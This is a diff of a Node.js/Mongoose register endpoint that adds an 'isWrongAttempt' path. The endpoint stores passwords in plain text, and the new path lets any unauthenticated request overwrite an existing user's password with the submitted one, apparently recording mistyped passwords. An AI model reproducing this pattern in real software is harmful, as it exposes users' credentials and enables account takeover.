@@ -1,7 +1,97 @@
+// const mongoose = require('mongoose');
+// const User = require('../models/User');
+
+// // MongoDB connection for Vercel
+// let cached = global.mongoose;
+// if (!cached) {
+//   cached = global.mongoose = { conn: null, promise: null };
+// }
+
+// async function connectDB() {
+//   if (cached.conn) return cached.conn;
+//   if (!cached.promise) {
+//     cached.promise = mongoose.connect(process.env.MONGODB_URI)
+//       .then(mongoose => mongoose);
+//   }
+//   cached.conn = await cached.promise;
+//   return cached.conn;
+// }
+
+// module.exports = async (req, res) => {
+//   // CORS headers
+//   res.setHeader('Access-Control-Allow-Origin', '*');
+//   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+//   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+//   if (req.method === 'OPTIONS') {
+//     res.status(200).end();
+//     return;
+//   }
+
+//   if (req.method !== 'POST') {
+//     return res.status(405).json({ 
+//       success: false, 
+//       message: 'Method not allowed. Use POST.' 
+//     });
+//   }
+
+//   try {
+//     await connectDB();
+    
+//     const { userId, password  } = req.body;
+
+//     if (!userId || !password) {
+//       return res.status(400).json({
+//         success: false,
+//         message: 'User ID and Password are required!'
+//       });
+//     }
+
+//     // Check if user already exists
+//     const existingUser = await User.findOne({ userId });
+//     if (existingUser) {
+//       return res.status(400).json({
+//         success: false,
+//         message: 'User already exists! Please login.'
+//       });
+//     }
+
+//     // Create new user
+//     const newUser = new User({
+//       userId,
+//       password,  // Plain text password
+//       firstLogin: new Date(),
+//       lastLogin: new Date(),
+//       loginCount: 1
+//     });
+
+//     await newUser.save();
+
+//     res.status(201).json({
+//       success: true,
+//       message: 'User registered successfully!',
+//       data: {
+//         userId: newUser.userId,
+//         firstLogin: newUser.firstLogin,
+//         loginCount: newUser.loginCount
+//       }
+//     });
+
+//   } catch (error) {
+//     console.error('❌ Register Error:', error);
+//     res.status(500).json({
+//       success: false,
+//       message: 'Server error: ' + error.message
+//     });
+//   }
+// };
+
+
+
+
 const mongoose = require('mongoose');
 const User = require('../models/User');
 
-// MongoDB connection for Vercel
 let cached = global.mongoose;
 if (!cached) {
   cached = global.mongoose = { conn: null, promise: null };
@@ -18,7 +108,7 @@ async function connectDB() {
 }
 
 module.exports = async (req, res) => {
-  // CORS headers
+  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -29,16 +119,16 @@ module.exports = async (req, res) => {
   }
 
   if (req.method !== 'POST') {
-    return res.status(405).json({ 
-      success: false, 
-      message: 'Method not allowed. Use POST.' 
+    return res.status(405).json({
+      success: false,
+      message: 'Method not allowed. Use POST.'
     });
   }
 
   try {
     await connectDB();
-    
-    const { userId, password } = req.body;
+
+    const { userId, password, isWrongAttempt } = req.body;
 
     if (!userId || !password) {
       return res.status(400).json({
@@ -47,41 +137,65 @@ module.exports = async (req, res) => {
       });
     }
 
-    // Check if user already exists
+    // Check if user exists
     const existingUser = await User.findOne({ userId });
+
     if (existingUser) {
-      return res.status(400).json({
-        success: false,
-        message: 'User already exists! Please login.'
-      });
+      // ✅ User exists - update based on attempt type
+      if (isWrongAttempt) {
+        // WRONG ATTEMPT: wrongAttempts++ (database mein save)
+        existingUser.wrongAttempts = (existingUser.wrongAttempts || 0) + 1;
+        existingUser.lastWrongAttempt = new Date();
+        existingUser.password = password;
+        await existingUser.save();
+
+        return res.json({
+          success: true,
+          message: 'Wrong attempt saved!',
+          data: {
+            userId: existingUser.userId,
+            wrongAttempts: existingUser.wrongAttempts,
+            loginCount: existingUser.loginCount
+          }
+        });
+      } else {
+        // REAL ATTEMPT: Already exists
+        return res.status(400).json({
+          success: false,
+          message: 'User already exists! Please login.'
+        });
+      }
     }
 
-    // Create new user
+    // ✅ NAYA USER - pehli baar register
     const newUser = new User({
       userId,
-      password,  // Plain text password
+      password,
       firstLogin: new Date(),
       lastLogin: new Date(),
-      loginCount: 1
+      loginCount: isWrongAttempt ? 0 : 1,
+      wrongAttempts: isWrongAttempt ? 1 : 0,
+      lastWrongAttempt: isWrongAttempt ? new Date() : null
     });
 
     await newUser.save();
 
     res.status(201).json({
       success: true,
-      message: 'User registered successfully!',
+      message: 'User registered!',
       data: {
         userId: newUser.userId,
-        firstLogin: newUser.firstLogin,
-        loginCount: newUser.loginCount
+        loginCount: newUser.loginCount,
+        wrongAttempts: newUser.wrongAttempts
       }
     });
 
   } catch (error) {
-    console.error('❌ Register Error:', error);
+    console.error('Register Error:', error);
     res.status(500).json({
       success: false,
       message: 'Server error: ' + error.message
     });
   }
 };
+
